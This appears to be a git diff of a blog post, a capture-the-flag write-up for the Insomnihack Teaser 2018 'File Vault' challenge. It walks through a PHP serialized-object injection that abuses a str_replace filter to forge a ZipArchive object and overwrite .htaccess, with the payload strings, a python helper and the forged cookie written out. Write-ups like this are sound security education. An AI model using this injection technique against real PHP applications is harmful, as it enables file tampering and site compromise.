@@ -1,7 +1,7 @@
 ---
 layout: post
 title: File Vault
-category: Insomnihack Teaser 2018
+category: insomnihack-teaser-2018
 ---
 
 # Description
@@ -86,7 +86,7 @@ s cookie, deserializes the `VaultFile` object via `s_unserialized()`
 and processes it accordingly.
 
 Here's is what a `VaultFile` object looks like :
-```
+```php
 a:1:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:4:"asdf";s:8:"realname";s:44:"6322fe412ca3cd526522d9d7fde5f2a383ca4c3f.txt";}}e28cae7d9495e4f9e9c65e268f8ac4d975f4c94e02b04fa1144a9400979dae23
 ```
 
@@ -154,7 +154,7 @@ the serialied object is signed and validated against a `$secret`. In the event
 of an invalid signature in the `s_unserialize()` function, the unserialized
 object is never returned :
 
-```
+```php
 function s_serialize($a, $secret) {
   $b = serialize($a);
   $b = str_replace("../","./",$b);
@@ -183,7 +183,7 @@ no methods allowing us to arbitrarly read/write files.
 The vulnerability in the application, which makes this challenge so interesting,
 is in the following code :
 
-```
+```php
 function s_serialize($a, $secret) {
   $b = serialize($a);
   $b = str_replace("../","./",$b);
@@ -196,7 +196,7 @@ here is that the `str_replace` call is performed on a *serialized object*,
 instead of a string.
 
 Why does this matter? Here's a snippet of a serialized array.
-```
+```php
 php > $array = array();
 php > $array[] = "../";
 php > $array[] = "hello";
@@ -206,7 +206,7 @@ a:2:{i:0;s:3:"../";i:1;s:5:"hello";}
 
 Let's perform the `../` "filter" :
 
-```
+```php
 php > echo str_replace("../","./", serialize($array));
 a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
 ```
@@ -219,14 +219,14 @@ When this new corrupted object will be processed by `unserialize()`, PHP
 will consider the next character in the serialized object (`"`) as being part
 of its value :
 
-```
+```php
 a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
               --- <== The value parsed by unserialize() is ./"
 ```
 
 The more `../` you add, the more characters end up being parsed by `unserialize()`.
 
-```
+```php
 php > $array = array();
 php > $array[] = "../../../../../../../../../../../../";
 php > $array[] = "hello";
@@ -259,7 +259,7 @@ In the event where we control the `hello` string, its just a matter
 of replacing `hello` with the end of a valid serialized object.
 Here's an example :
 
-```
+```php
 php > $array = array();
 php > $array[] = "../../../../../../../../../../../../../";
 php > $array[] = 'A";i:1;s:8:"Injected';
@@ -307,7 +307,8 @@ functions...
 
 So far, we've used pretty much all of the features of the webapp with the exception
 of one : `open`. Here is the implementation :
-```
+
+```php
 case 'open':
     $files = s_unserialize($_COOKIE['files'], $secret);
     if(isset($files[$_GET['i']])){
@@ -331,7 +332,8 @@ objects, we also control the parameters of the `open()` call
 (`fakename` and `realname`).
 
 Let's list all classes containing an `open()` method :
-```
+
+```php
 $ cat list.php
 <?php
   foreach (get_declared_classes() as $class) {
@@ -341,7 +343,9 @@ $ cat list.php
     }
   }
 ?>
+```
 
+```bash
 $ php list.php
 SQLite3->open
 SessionHandler->open
@@ -368,7 +372,7 @@ Let's develop our final payload.
 
 I created a python script to automate the actions of the web app.
 
-```
+```python
 #!/usr/bin/env python2
 
 import requests
@@ -399,13 +403,13 @@ def open_file(index):
 ```
 
 Let's prepare our VaultFile objects by uploading two files :
-```
+```python
 upload("A")
 upload("B")
 ```
 
 The webapp will send us the following cookie :
-```
+```php
 a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:1:"A";s:8:"realname";s:44:
 "911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:
 {s:8:"fakename";s:1:"B";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3
@@ -426,7 +430,7 @@ Therefore, to reach `fakename` #2, we need to rename the first
 We'll want to prepare a ZipArchive object to inject in this cookie.
 Let's create one:
 
-```
+```php
 php > $zip = new ZipArchive();
 php > $zip->fakename = "sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";
 php > $zip->realname = "9";
@@ -439,7 +443,7 @@ Since our goal is to call `ZipArchive->open(".htaccess", "9")`, we added a `fake
 If we inject our object as is, we will be left with a trailing `realname`.
 This might clash with the forged `realname` we created above.
 
-```
+```php
 ";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt
 ```
 
@@ -447,7 +451,7 @@ We can remove the trailing `realname` by updating the size of the serialized
 `ZipArchive->comment` parameter. The size of the trailing section is 67,
 so we update the `comment` size accordingly.
 
-```
+```php
 O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";}
 ```
 
@@ -456,24 +460,22 @@ O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa
 We now have all the ingredients. Let's rename our second
 `VaultFile->fakename` :
 
-```
-{% raw %}
+```php
 # We end the first object with a dummy parameter, then start the second object
 # with our ZipArchive
 serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'
-{% endraw %}
 
 rename(1, serialized_injection)
 ```
 
 Let's now rename our first `VaultFile->fakename` :
-```
+```python
 newname = "../" * 115 # To overwrite fakename #2
 rename(0, newname)
 ```
 
 In the end, we'll receive the following cookie :
-```
+```php
 a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:345:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:245:"";s:1:"e";s:0:"";}i:2;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}}6f72e63954ac6e08c3ebc6e4abdff60956a82d9ebc556873410c9ef456098b69
 ```
 
